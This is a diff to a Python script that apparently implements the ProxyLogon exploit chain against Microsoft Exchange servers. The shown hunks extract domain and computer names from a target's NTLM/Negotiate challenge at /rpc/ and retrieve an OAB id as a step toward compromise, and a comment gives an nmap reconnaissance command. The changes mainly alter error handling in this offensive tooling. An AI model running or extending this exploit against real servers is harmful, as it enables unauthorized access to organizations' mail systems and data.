@@ -114,16 +114,12 @@ def get_ComputerName():
     # nmap MAIL  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
     r = requests.get('https://%s/rpc/' % target, headers=headers, verify=False, proxies=proxies)
     auth_header = r.headers['WWW-Authenticate']
-    if "NTLM" in auth_header:
-        print("[-] Got domain and computer failure !")
-        exit()
-    else:
-        auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
-        domain_name, computer_name = parse_challenge(base64.b64decode(auth))
-        print("[+] domain : ", domain_name)
-        print(" |")
-        print("[+] computer : ", computer_name)
-        return computer_name, domain_name
+    auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
+    domain_name, computer_name = parse_challenge(base64.b64decode(auth))
+    print("[+] domain : ", domain_name)
+    print(" |")
+    print("[+] computer : ", computer_name)
+    return computer_name, domain_name
 
 
 # 获取sid
@@ -237,8 +233,12 @@ def proxyLogon(sid):
                        )
 
     if ct.status_code != 200:
-        print("GetOAB Error!")
+        print("[-] GetOAB Error!")
         exit()
+    elif "RawIdentity" not in ct.text:
+        print("[-] Get OAB Error!")
+        exit()
+        
     oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
     print(" |")
     print("[*]Got OAB id")
